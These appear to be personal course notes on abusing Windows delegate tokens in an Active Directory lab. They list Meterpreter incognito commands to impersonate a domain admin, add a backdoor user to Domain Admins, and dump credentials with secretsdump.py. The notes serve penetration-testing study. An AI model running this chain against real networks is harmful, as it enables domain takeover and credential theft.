**Tokens**: Temp keys that allows access to a system/network without having to provide creds each time you access, think cookies for a computer !!  
**Two types**: this course here the focus will be to abuse Delegate tokens.  
1. Delegate: Created for logging into a machine or using remote desktop !  
2. Impersonate: "non-interactive" such as attaching a network drive or domain login script ! Or domain join script like the one you saw on your vic machine c drive !

**Problem**: say domain admin has logged into the victim machine !  
Can impersonate as dc-admin and become that user on the victim machine !!  

With msfconcole meterpreter shell:  should be local admin to print tokens ? yes  
getuid  //admin on target  
Load incognito  //load the module  
List_tokens -u  //list available tokens  
Impersonate_token marvel\\adminitrator  // double \\ impersonate  
//once we have impersonated as say domain admin - can create a new user and add it to domain admins then dumpsecrets  
Net user /add soda Password123 /domain  
Net group "Domain Admins" soda /ADD /DOMAIN  
Secretsdump.py marvel.local/soda:'Password123'@10.1.1.1  
